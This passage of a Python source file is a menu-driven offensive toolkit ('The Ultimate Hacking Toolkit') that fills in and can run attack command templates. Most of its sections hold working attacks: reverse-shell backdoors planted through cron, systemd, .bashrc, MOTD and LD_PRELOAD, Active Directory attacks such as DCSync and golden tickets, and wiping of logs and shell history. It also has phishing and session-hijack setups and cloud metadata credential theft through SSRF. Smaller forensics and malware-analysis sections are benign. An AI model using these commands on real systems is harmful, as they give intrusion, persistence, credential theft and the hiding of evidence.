          "cmd": lambda f: f"crackmapexec smb {f[0]} -u {f[1]} -p '{f[2]}' --shares --sessions --loggedon-users" },
        { "id":"7",  "name":"DCSync",               "desc":"Replicate domain hashes via DCSync",
          "fields":[("d","Domain","corp.local"),("u","User","Administrator"),("p","Password","P@ssw0rd"),("dc","DC IP","10.0.0.1")],
          "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{f[0]}/{f[1]}:{f[2]}@{f[3]}' -just-dc" },
        { "id":"8",  "name":"Pass-the-Ticket",      "desc":"Import Kerberos TGT and use it",
          "fields":[("t","Ticket file","admin.ccache")],
          "cmd": lambda f: f"export KRB5CCNAME={f[0]}; python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass corp.local/administrator@dc01" },
        { "id":"9",  "name":"Golden Ticket",        "desc":"Forge golden Kerberos ticket",
          "fields":[("d","Domain","corp.local"),("sid","Domain SID","S-1-5-21-..."),("h","KRBTGT hash","aad3..."),("u","Target user","administrator")],
          "cmd": lambda f: f'python3 ticketer.py -nthash {f[2]} -domain-sid {f[1]} -domain {f[0]} {f[3]}' },
        { "id":"10", "name":"Zerologon Check",      "desc":"CVE-2020-1472 Netlogon vuln check",
          "fields":[("dc","DC hostname","DC01"),("ip","DC IP","10.0.0.1")],
          "cmd": lambda f: f"python3 zerologon_tester.py {f[0]} {f[1]}" },
        { "id":"11", "name":"SMB Relay",            "desc":"Relay NTLM auth to gain access",
          "fields":[("t","Target IP","10.0.0.5"),("i","Interface","eth0")],
          "cmd": lambda f: f"responder -I {f[1]} -rdw --disable-ess\n# in separate tab:\nntlmrelayx.py -tf targets.txt -smb2support" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "persist": { "label": "PERSISTENCE", "tools": [
        { "id":"1",  "name":"Cron Backdoor",        "desc":"Cron reverse shell every 5 min",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f'(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1") | crontab -' },
        { "id":"2",  "name":"Systemd Service",      "desc":"Drop persistent systemd backdoor",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f"""cat > /etc/systemd/system/netsync.service << 'EOF'
[Unit]
Description=Network Sync
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl enable netsync && systemctl start netsync""" },
        { "id":"3",  "name":".bashrc Hook",         "desc":"Inject into shell init",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f'echo "bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1 &" >> ~/.bashrc' },
        { "id":"4",  "name":"SSH Authorized Key",   "desc":"Drop attacker pubkey for SSH access",
          "fields":[("k","Public key","ssh-rsa AAAA...")],
          "cmd": lambda f: f'mkdir -p ~/.ssh && echo "{f[0]}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys' },
        { "id":"5",  "name":"MOTD Backdoor",        "desc":"Inject into /etc/update-motd.d/",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f'echo "bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1 &" >> /etc/update-motd.d/00-header' },
        { "id":"6",  "name":"LD_PRELOAD Hook",      "desc":"Shared library injection hook",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f'echo "void __attribute__((constructor)) init(){{system(\\"bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1 &\\");}}" > hook.c\ngcc -shared -fPIC -o /tmp/hook.so hook.c\nexport LD_PRELOAD=/tmp/hook.so' },
        { "id":"7",  "name":"At Job",               "desc":"One-time persistence via at daemon",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444"),("t","Time","now + 1 minute")],
          "cmd": lambda f: f'echo "bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1" | at "{f[2]}"' },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "log": { "label": "LOG CLEAR", "tools": [
        { "id":"1",  "name":"Full Log Wipe",        "desc":"Wipe auth, syslog, kern logs",
          "fields":[],
          "cmd": lambda f: "for log in /var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/messages /var/log/secure /var/log/lastlog; do cat /dev/null > $log 2>/dev/null; done; echo done" },
        { "id":"2",  "name":"Bash History Nuke",    "desc":"Destroy shell history completely",
          "fields":[],
          "cmd": lambda f: "history -c; cat /dev/null > ~/.bash_history; unset HISTFILE; export HISTSIZE=0" },
        { "id":"3",  "name":"UTMP/WTMP Wipe",       "desc":"Erase who/last/w login records",
          "fields":[],
          "cmd": lambda f: "cat /dev/null > /var/run/utmp; cat /dev/null > /var/log/wtmp; cat /dev/null > /var/log/btmp" },
        { "id":"4",  "name":"Shred File",           "desc":"Overwrite + delete file securely",
          "fields":[("f","File path","/tmp/payload.elf")],
          "cmd": lambda f: f"shred -zvun 7 {f[0]}" },
        { "id":"5",  "name":"Timestamp Stomp",      "desc":"Clone timestamps from reference",
          "fields":[("f","Target file","/tmp/evil.sh"),("r","Reference file","/etc/passwd")],
          "cmd": lambda f: f"touch -r {f[1]} {f[0]}; stat {f[0]}" },
        { "id":"6",  "name":"Disable Syslog",       "desc":"Kill syslog daemon temporarily",
          "fields":[],
          "cmd": lambda f: "systemctl stop syslog 2>/dev/null; service rsyslog stop 2>/dev/null; pkill -9 syslogd 2>/dev/null; pkill -9 rsyslogd 2>/dev/null" },
        { "id":"7",  "name":"Selective Log Edit",   "desc":"Remove specific lines from log",
          "fields":[("f","Log file","/var/log/auth.log"),("p","Pattern to erase","192.168.1.100")],
          "cmd": lambda f: f"sed -i '/{f[1]}/d' {f[0]}" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "forensics": { "label": "FORENSICS", "tools": [
        { "id":"1",  "name":"Volatility 3",         "desc":"Memory forensics + analysis",
          "fields":[("i","Memory image","/evidence/ram.mem"),("p","Plugin","windows.pslist.PsList")],
          "cmd": lambda f: f"python3 vol.py -f {f[0]} {f[1]}" },
        { "id":"2",  "name":"Binwalk",              "desc":"Firmware analysis + file carving",
          "fields":[("f","Target file","firmware.bin")],
          "cmd": lambda f: f"binwalk -e --dd='.*' {f[0]}" },
        { "id":"3",  "name":"Strings + Grep",       "desc":"Extract readable strings from binary",
          "fields":[("f","Binary","malware.exe"),("p","Pattern (opt)","password|api_key")],
          "cmd": lambda f: f"strings -a {f[0]}" + (f" | grep -iE '{f[1]}'" if f[1] else "") },
        { "id":"4",  "name":"File Timeline",        "desc":"Build filesystem activity timeline",
          "fields":[("i","Disk image","/evidence/disk.dd"),("o","Output CSV","timeline.csv")],
          "cmd": lambda f: f"fls -r -m / {f[0]} | mactime -b - -d 2000-01-01 > {f[1]}" },
        { "id":"5",  "name":"Exiftool",             "desc":"Extract metadata from any file",
          "fields":[("f","File","photo.jpg")],
          "cmd": lambda f: f"exiftool {f[0]}" },
        { "id":"6",  "name":"Autopsy (CLI)",        "desc":"Launch Autopsy forensics framework",
          "fields":[],
          "cmd": lambda f: "autopsy &" },
        { "id":"7",  "name":"dd Disk Image",        "desc":"Create raw disk image",
          "fields":[("d","Source device","/dev/sda"),("o","Output","disk.dd")],
          "cmd": lambda f: f"dd if={f[0]} of={f[1]} bs=4M status=progress" },
        { "id":"8",  "name":"File Type Check",      "desc":"Identify file type + entropy",
          "fields":[("f","File","suspicious.bin")],
          "cmd": lambda f: f"file {f[0]}; xxd {f[0]} | head -20; ent {f[0]} 2>/dev/null || python3 -c \"import math,collections; d=open('{f[0]}','rb').read(); cnt=collections.Counter(d); e=-sum(c/len(d)*math.log2(c/len(d)) for c in cnt.values()); print('Entropy:',round(e,3))\"" },
        { "id":"9",  "name":"Yara Scan",            "desc":"Scan file/dir with YARA rules",
          "fields":[("r","Rules file","malware.yar"),("t","Target","/tmp")],
          "cmd": lambda f: f"yara {f[0]} {f[1]} -r" },
        { "id":"10", "name":"Network PCAP Analyze", "desc":"Extract creds + files from pcap",
          "fields":[("p","PCAP file","capture.pcap")],
          "cmd": lambda f: f"tcpdump -r {f[0]} -A | grep -iE 'pass|user|login|cookie|auth'\nnetworkMiner {f[0]} 2>/dev/null &" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "phishing": { "label": "PHISHING & SE", "tools": [
        { "id":"1",  "name":"GoPhish Launch",       "desc":"Launch GoPhish campaign server",
          "fields":[],
          "cmd": lambda f: "cd /opt/gophish && ./gophish &; echo 'Admin panel: https://localhost:3333'" },
        { "id":"2",  "name":"SET Toolkit",          "desc":"Social Engineering Toolkit",
          "fields":[],
          "cmd": lambda f: "setoolkit" },
        { "id":"3",  "name":"Evilginx2",            "desc":"Reverse proxy phishing + session hijack",
          "fields":[("d","Your domain","attacker.com"),("lh","LHOST IP","1.2.3.4")],
          "cmd": lambda f: f"evilginx2 -p /usr/share/evilginx2/phishlets -c {f[0]}" },
        { "id":"4",  "name":"Beef-XSS Hook",        "desc":"Browser exploitation via XSS hook",
          "fields":[],
          "cmd": lambda f: "beef-xss &; echo 'Panel: http://localhost:3000/ui/panel'\necho 'Hook: <script src=\"http://YOUR-IP:3000/hook.js\"></script>'" },
        { "id":"5",  "name":"Clone Website",        "desc":"Clone target site for credential harvest",
          "fields":[("u","Target URL","https://login.target.com"),("p","Port","80")],
          "cmd": lambda f: f"wget -r -l2 --no-check-certificate -P /var/www/html/clone {f[0]}" },
        { "id":"6",  "name":"Email Spoof Check",    "desc":"Check if domain allows email spoofing",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"dig +short TXT {f[0]} | grep spf\ndig +short TXT _dmarc.{f[0]}\ndig +short MX {f[0]}" },
        { "id":"7",  "name":"Phishing Page Gen",    "desc":"Generate credential harvester HTML",
          "cmd": lambda f: "# Deploy: python3 -m http.server {}\nCapture at: nc -nlvp {} | grep POST".format(f[2], f[1]) },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "mobile": { "label": "MOBILE / APK", "tools": [
        { "id":"1",  "name":"APK Decompile",        "desc":"Decompile APK with apktool",
          "fields":[("f","APK file","app.apk")],
          "cmd": lambda f: f"apktool d {f[0]} -o apk_out/" },
        { "id":"2",  "name":"APK Repack",           "desc":"Rebuild + sign modified APK",
          "fields":[("d","APK dir","apk_out")],
          "cmd": lambda f: f"apktool b {f[0]} -o repacked.apk\njarsigner -keystore mykey.jks repacked.apk alias_name" },
        { "id":"3",  "name":"Frida Hook",           "desc":"Instrument app at runtime with Frida",
          "fields":[("p","Package name","com.target.app"),("s","Script","ssl_bypass.js")],
          "cmd": lambda f: f"frida -U -f {f[0]} -l {f[1]} --no-pause" },
        { "id":"4",  "name":"SSL Pinning Bypass",   "desc":"Bypass SSL certificate pinning",
          "fields":[("p","Package name","com.target.app")],
          "cmd": lambda f: f"frida -U -f {f[0]} -l /opt/frida-scripts/ssl-bypass.js --no-pause\n# Alt: objection -g {f[0]} explore --startup-command 'android sslpinning disable'" },
        { "id":"5",  "name":"ADB Shell",            "desc":"Android Debug Bridge shell",
          "fields":[("ip","Device IP","192.168.1.100")],
          "cmd": lambda f: f"adb connect {f[0]}:5555; adb shell" },
        { "id":"6",  "name":"APK Static Analysis",  "desc":"Extract secrets from APK",
          "fields":[("f","APK file","app.apk")],
          "cmd": lambda f: f"apktool d {f[0]} -o apk_static/\ngrep -r 'api_key\\|password\\|secret\\|token\\|http' apk_static/ --include='*.xml' --include='*.smali' -i | head -50" },
        { "id":"7",  "name":"MobSF Analysis",       "desc":"Launch Mobile Security Framework",
          "fields":[],
          "cmd": lambda f: "docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n# Then: http://localhost:8000" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "crypto": { "label": "CRYPTO & ENCODING", "tools": [
        { "id":"1",  "name":"Base64 En/Decode",     "desc":"Encode or decode base64",
          "fields":[("d","Data","hello world"),("m","Mode (enc/dec)","enc")],
          "cmd": lambda f: (f'echo -n "{f[0]}" | base64' if f[1]=="enc" else f'echo "{f[0]}" | base64 -d') },
        { "id":"2",  "name":"ROT13",                "desc":"ROT13 cipher",
          "fields":[("d","Data","Hello World")],
          "cmd": lambda f: f'echo "{f[0]}" | tr A-Za-z N-ZA-Mn-za-m' },
        { "id":"3",  "name":"Caesar Cipher",        "desc":"Brute force Caesar shift",
          "fields":[("d","Ciphertext","Khoor")],
          "cmd": lambda f: f"python3 -c \"c='{f[0]}'; [print(f'Shift {{s}}: {{\"\".join(chr((ord(x)-65+s)%26+65) if x.isupper() else chr((ord(x)-97+s)%26+97) if x.islower() else x for x in c)}}') for s in range(26)]\"" },
        { "id":"4",  "name":"XOR Decrypt",         "desc":"XOR a string with a key",
          "fields":[("d","Hex data","48656c6c6f"),("k","Key","secret")],
          "cmd": lambda f: f'python3 -c "d=bytes.fromhex(\'{f[0]}\'); k=b\'{f[1]}\'; print(bytes(d[i]^k[i%len(k)] for i in range(len(d))))"' },
        { "id":"5",  "name":"Hash Generator",       "desc":"Generate hashes of a string",
          "fields":[("d","Data","password123")],
          "cmd": lambda f: f'python3 -c "import hashlib; d=b\'{f[0]}\'; [print(f\'{{a}}: {{hashlib.new(a,d).hexdigest()}}\') for a in [\'md5\',\'sha1\',\'sha256\',\'sha512\']]"' },
        { "id":"6",  "name":"OpenSSL Encrypt",      "desc":"AES-256 encrypt a file",
          "fields":[("f","Input file","secret.txt"),("o","Output","secret.enc")],
          "cmd": lambda f: f"openssl enc -aes-256-cbc -pbkdf2 -in {f[0]} -out {f[1]}" },
        { "id":"7",  "name":"OpenSSL Decrypt",      "desc":"AES-256 decrypt a file",
          "fields":[("f","Encrypted file","secret.enc"),("o","Output","decrypted.txt")],
          "cmd": lambda f: f"openssl enc -d -aes-256-cbc -pbkdf2 -in {f[0]} -out {f[1]}" },
        { "id":"8",  "name":"RSA Key Extract",      "desc":"Extract public key from cert/key",
          "fields":[("f","Cert/Key file","cert.pem")],
          "cmd": lambda f: f"openssl rsa -in {f[0]} -text -noout 2>/dev/null || openssl x509 -in {f[0]} -text -noout" },
        { "id":"9",  "name":"Steghide",             "desc":"Hide/extract data in image steganography",
          "fields":[("m","Mode (embed/extract)","extract"),("f","Image file","photo.jpg"),("o","Output","hidden.txt")],
          "cmd": lambda f: (f"steghide extract -sf {f[1]} -p '' -xf {f[2]}" if f[0]=="extract" else f"steghide embed -cf {f[1]} -ef {f[2]}") },
        { "id":"10", "name":"CyberChef CLI",        "desc":"Magic decode (try all common encodings)",
          "fields":[("d","Data","SGVsbG8gV29ybGQ=")],
          "cmd": lambda f: f'python3 -c "\nimport base64, binascii, urllib.parse, html\nd = \'{f[0]}\'\ntry: print(\'b64:\', base64.b64decode(d).decode())\nexcept: pass\ntry: print(\'hex:\', bytes.fromhex(d).decode())\nexcept: pass\nprint(\'url:\', urllib.parse.unquote(d))\nprint(\'html:\', html.unescape(d))\n"' },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "cloud": { "label": "CLOUD ATTACK", "tools": [
        { "id":"1",  "name":"AWS Metadata SSRF",    "desc":"Steal AWS creds via metadata endpoint",
          "fields":[("u","SSRF URL","http://target.com/fetch?url=")],
          "cmd": lambda f: f'curl -s "{f[0]}http://169.254.169.254/latest/meta-data/iam/security-credentials/"' },
        { "id":"2",  "name":"AWS Enum (CLI)",        "desc":"Enumerate AWS with stolen creds",
          "fields":[("ak","Access Key","AKIA..."),("sk","Secret Key","xxx"),("r","Region","us-east-1")],
          "cmd": lambda f: f"export AWS_ACCESS_KEY_ID={f[0]}; export AWS_SECRET_ACCESS_KEY={f[1]}; export AWS_DEFAULT_REGION={f[2]}\naws sts get-caller-identity\naws s3 ls\naws iam list-users\naws ec2 describe-instances" },
        { "id":"3",  "name":"S3 Bucket Enum",       "desc":"Find public S3 buckets for a target",
          "fields":[("d","Domain/Company","targetcorp")],
          "cmd": lambda f: f"for b in {f[0]} {f[0]}-backup {f[0]}-dev {f[0]}-staging {f[0]}-prod {f[0]}-data; do aws s3 ls s3://$b 2>/dev/null && echo \"[+] Found: $b\"; done" },
        { "id":"4",  "name":"GCP Metadata",         "desc":"Steal GCP service account token",
          "fields":[("u","SSRF URL","http://target.com/fetch?url=")],
          "cmd": lambda f: f'curl -s "{f[0]}http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"' },
        { "id":"5",  "name":"Azure Metadata",       "desc":"Steal Azure managed identity token",
          "fields":[("u","SSRF URL","http://target.com/fetch?url=")],
          "cmd": lambda f: f'curl -s "{f[0]}http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata:true"' },
        { "id":"6",  "name":"Docker Registry",      "desc":"Pull images from exposed Docker registry",
          "fields":[("r","Registry IP:port","10.0.0.5:5000")],
          "cmd": lambda f: f"curl -s http://{f[0]}/v2/_catalog\ncurl -s http://{f[0]}/v2/<image>/tags/list\ndocker pull {f[0]}/<image>" },
        { "id":"7",  "name":"Kubernetes Enum",      "desc":"Enumerate exposed Kubernetes API",
          "fields":[("t","Target IP","10.0.0.5"),("p","Port","6443")],
          "cmd": lambda f: f"curl -k https://{f[0]}:{f[1]}/api/v1/namespaces\ncurl -k https://{f[0]}:{f[1]}/api/v1/pods\ncurl -k https://{f[0]}:{f[1]}/api/v1/secrets" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "malware": { "label": "MALWARE ANALYSIS", "tools": [
        { "id":"1",  "name":"VirusTotal Check",     "desc":"Check file hash against VirusTotal",
          "fields":[("f","File","suspicious.exe"),("k","VT API Key","your_api_key")],
          "cmd": lambda f: f'sha256=$(sha256sum {f[0]} | cut -d" " -f1)\ncurl -s -H "x-apikey: {f[1]}" "https://www.virustotal.com/api/v3/files/$sha256" | python3 -m json.tool' },
        { "id":"2",  "name":"Static PE Analysis",  "desc":"Analyse PE headers + imports",
          "fields":[("f","PE file","malware.exe")],
          "cmd": lambda f: f"file {f[0]}; strings {f[0]} | grep -iE 'http|cmd|powershell|reg|key|pass'\nexiftool {f[0]} 2>/dev/null\npython3 -c \"import pefile; pe=pefile.PE('{f[0]}'); [print(e.name.decode()) for e in pe.DIRECTORY_ENTRY_IMPORT]\" 2>/dev/null" },
        { "id":"3",  "name":"Dynamic Sandbox",     "desc":"Run in isolated sandbox (Cuckoo)",
          "fields":[("f","File","malware.exe")],
          "cmd": lambda f: f"cuckoo submit {f[0]}\n# Results: http://localhost:8000" },
        { "id":"4",  "name":"strace / ltrace",     "desc":"Trace syscalls and lib calls",
          "fields":[("b","Binary","./malware")],
          "cmd": lambda f: f"strace -o strace.log {f[0]} &\nstrace_pid=$!\ncat strace.log | grep -E 'open|read|write|connect|socket'" },
        { "id":"5",  "name":"Detect Packers",      "desc":"Detect binary packing/obfuscation",
          "fields":[("f","File","suspicious.exe")],
          "cmd": lambda f: f"python3 -c \"import math,collections; d=open('{f[0]}','rb').read(); cnt=collections.Counter(d); e=-sum(c/len(d)*math.log2(c/len(d)) for c in cnt.values()); print('Entropy:',round(e,3),'(>7.0 = likely packed)')\"\nexiftool {f[0]} | grep -i pack" },
        { "id":"6",  "name":"YARA Rule Write",     "desc":"Generate basic YARA rule from strings",
          "fields":[("f","File","malware.exe"),("n","Rule name","detect_malware")],
          "cmd": lambda f: "yara-gen: strings -a {} | sort -u | head -20 > strings.txt\nWrite rule manually from output".format(f[0]) },
        { "id":"7",  "name":"Deobfuscate PowerShell","desc":"Decode obfuscated PowerShell",
          "fields":[("s","PS Script/File","script.ps1")],
          "cmd": lambda f: f"cat {f[0]} | python3 -c \"import sys,base64,re; d=sys.stdin.read(); m=re.findall(r'[A-Za-z0-9+/]{{40,}}={'{'}0,2{'}'}', d); [print(base64.b64decode(x+('='*(4-len(x)%4))).decode('utf-16-le','ignore')) for x in m]\"" },
    ]},
}

# ─── CHEAT SHEET ─────────────────────────────────────────────────────────────
CHEATSHEET = [
    ("TTY Upgrade",        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm  # Ctrl+Z → stty raw -echo → fg"),
    ("SSH Port Forward",   "ssh -L 8080:127.0.0.1:80 user@target   # local\nssh -R 4444:127.0.0.1:4444 user@jump    # remote"),
    ("File Transfer",      "python3 -m http.server 8000\ncurl http://atk:8000/file -o /tmp/file"),
    ("Netcat Listener",    "rlwrap nc -nlvp 4444"),
    ("SUID Find",          "find / -perm -4000 -type f 2>/dev/null"),
    ("World Writable",     "find / -perm -0002 -type f 2>/dev/null"),
    ("Passwd Hash Gen",    "openssl passwd -6 -salt xyz newpassword"),
    ("Decode Base64",      "echo 'string' | base64 -d"),
    ("Hex Dump",           "xxd file.bin | head -30"),
    ("Port Scan Bash",     "for p in {1..1000}; do (echo >/dev/tcp/target/$p) 2>/dev/null && echo open:$p; done"),
    ("Find Configs",       "find / -name '*.conf' -o -name '.env' 2>/dev/null"),
    ("Process by Port",    "ss -tlnp | grep ':80'"),
    ("Capabilities",       "getcap -r / 2>/dev/null"),
    ("Writable PATH",      "echo $PATH | tr ':' '\\n' | xargs -I{} find {} -writable -type f 2>/dev/null"),
    ("Linux Users",        "cat /etc/passwd | grep -v nologin | grep -v false"),
    ("Network Connections","ss -antp; netstat -tulpn 2>/dev/null"),
    ("Env Secrets",        "env | grep -iE 'pass|key|secret|token|api'"),
    ("Find SSH Keys",      "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null"),
    ("Docker Check",       "cat /proc/1/cgroup | grep docker; ls -la /var/run/docker.sock 2>/dev/null"),
    ("Meterpreter Persist","run persistence -h"),
]

# ─── BANNER ───────────────────────────────────────────────────────────────────
BANNER = """
██╗     ██╗   ██╗ ██████╗██╗██╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
██║     ██║   ██║██╔════╝██║██║██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
██║     ██║   ██║██║     ██║██║███████╗       ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║   
██║     ██║   ██║██║     ██║██║╚════██║       ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║   
███████╗╚██████╔╝╚██████╗██║██║███████║       ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║   
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝"""

CATEGORY_KEYS = list(TOOLS.keys())

def clear():
    os.system("clear" if os.name != "nt" else "cls")

# ─── UI ───────────────────────────────────────────────────────────────────────
def show_banner():
    clear()
    console.print(Text(BANNER, style="bold #ff4d6d"))
    console.print(Align.center(Text("made by lucii", style="#666666 italic")))
    console.print()

def show_main_menu():
    show_banner()

    total_tools = sum(len(s["tools"]) for s in TOOLS.values())
    console.print(Align.center(
        Panel(f"[bold #ff4d6d]{total_tools} tools[/]  [#444]·[/]  [bold #ffd60a]{len(TOOLS)} categories[/]  [#444]·[/]  [#00ff9d]The Ultimate Hacking Toolkit[/]",
              border_style="#222222", padding=(0, 4))
    ))
    console.print()

    col1 = Table(box=box.MINIMAL, show_header=False, padding=(0,1), border_style="#222")
    col1.add_column("n", style="#555", width=3)
    col1.add_column("cat", width=22)
    col1.add_column("cnt", justify="right", width=4)

    col2 = Table(box=box.MINIMAL, show_header=False, padding=(0,1), border_style="#222")
    col2.add_column("n", style="#555", width=3)
    col2.add_column("cat", width=22)
    col2.add_column("cnt", justify="right", width=4)

    keys = list(TOOLS.items())
    mid = len(keys) // 2 + len(keys) % 2

    for i, (key, s) in enumerate(keys, 1):
        col = C[key]
        row = (str(i), f"[bold {col}]{s['label']}[/]", f"[{col}]{len(s['tools'])}[/]")
        if i <= mid:
            col1.add_row(*row)
        else:
            col2.add_row(*row)

    console.print(Columns([col1, col2], equal=True, expand=True))
    console.print()
    console.print(f"  [#444]select[/] [#ff4d6d]1-{len(TOOLS)}[/]  [#444]│[/]  [#ffd60a]c[/] [#444]cheatsheet[/]  [#444]│[/]  [#666]q[/] [#444]quit[/]")
    console.print()

def show_category(key):
    s = TOOLS[key]
    col = C[key]
    clear()
    console.print()
    console.print(Rule(f"[bold {col}] {s['label']} [/]  [#444]{len(s['tools'])} tools[/]", style="#333"))
    console.print()

    table = Table(box=box.SIMPLE, show_header=True,
                  header_style=f"bold {col}",
                  border_style="#222", expand=True, padding=(0,1))
    table.add_column("#", width=4, style="#555")
    table.add_column("Tool", width=26)
    table.add_column("Description", style="#777")

    for t in s["tools"]:
        table.add_row(t["id"], f"[bold {col}]{t['name']}[/]", t["desc"])

    console.print(table)
    console.print(f"\n  [#555]select tool #[/]  [#444]│[/]  [#ffd60a]b[/] [#555]back[/]\n")

def collect_fields(tool, col):
    values = []
    if tool["fields"]:
        console.print(f"\n  [bold {col}]parameters[/]  [#444](enter = default)[/]\n")
        for _, label, default in tool["fields"]:
            val = Prompt.ask(f"  [#aaa]{label}[/]", default=default,
                             show_default=True, console=console)
            values.append(val.strip())
    return values

def show_tool(tool, col):
    clear()
    console.print()
    console.print(Rule(f"[bold {col}] {tool['name']} [/]", style=col))
    console.print(f"  [#555]{tool['desc']}[/]\n")

    values = collect_fields(tool, col)

    try:
        cmd = tool["cmd"](values)
    except Exception as e:
        cmd = f"# error: {e}"

    console.print(f"\n  [bold {col}]command[/]\n")
    console.print(Panel(
        Syntax(cmd, "bash", theme="one-dark", line_numbers=False, word_wrap=True),
        border_style="#333", padding=(0,1)
    ))
    console.print(f"\n  [#ffd60a]r[/] [#555]run[/]  [#444]│[/]  [#00ff9d]g[/] [#555]regenerate[/]  [#444]│[/]  [#666]b[/] [#555]back[/]\n")
    return cmd

def show_cheatsheet():
    clear()
    console.print()
    console.print(Rule("[bold #ffd60a] CHEAT SHEET [/]  [#444]20 one-liners[/]", style="#333"))
    console.print()
    for title, cmd in CHEATSHEET:
        console.print(f"  [bold #ffd60a]{title}[/]")
        console.print(Panel(
            Syntax(cmd, "bash", theme="one-dark", word_wrap=True),
            border_style="#222", padding=(0,1)
        ))
        console.print()
    console.print("  [#555]enter to go back[/]")
    input()

# ─── MAIN LOOP ────────────────────────────────────────────────────────────────
def run_tool_loop(key):
    s = TOOLS[key]
    col = C[key]
    while True:
        show_category(key)
        choice = Prompt.ask("  [#aaa]→[/]", console=console).strip().lower()
        if choice == "b":
            break
        tool = next((t for t in s["tools"] if t["id"] == choice), None)
        if not tool:
            console.print("  [#f00]not found[/]")
            continue
        while True:
            cmd = show_tool(tool, col)
            action = Prompt.ask("  [#aaa]→[/]", console=console).strip().lower()
            if action == "b":
                break
            elif action == "r":
                console.print(f"\n  [bold {col}]running...[/]\n")
                try:
                    subprocess.run(cmd, shell=True, executable="/bin/bash")
                except KeyboardInterrupt:
                    pass
                console.print("\n  [#555]enter to continue[/]")
                input()
                break
            elif action == "g":
                continue
            else:
                console.print("  [#f00]unknown[/]")

def main():
    try:
        readline.parse_and_bind("tab: complete")
    except Exception:
        pass
    while True:
        show_main_menu()
        choice = Prompt.ask("  [#aaa]→[/]", console=console).strip().lower()
        if choice == "q":
            clear()
            console.print(f"\n  [#ff4d6d]lucii's toolkit offline.[/]\n")
            sys.exit(0)
        elif choice == "c":
            show_cheatsheet()
        elif choice.isdigit() and 1 <= int(choice) <= len(CATEGORY_KEYS):
            run_tool_loop(CATEGORY_KEYS[int(choice) - 1])
        else:
            console.print("  [#f00]unknown[/]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        console.print(f"\n  [#ff4d6d]lucii's toolkit offline.[/]\n")
        sys.exit(0)
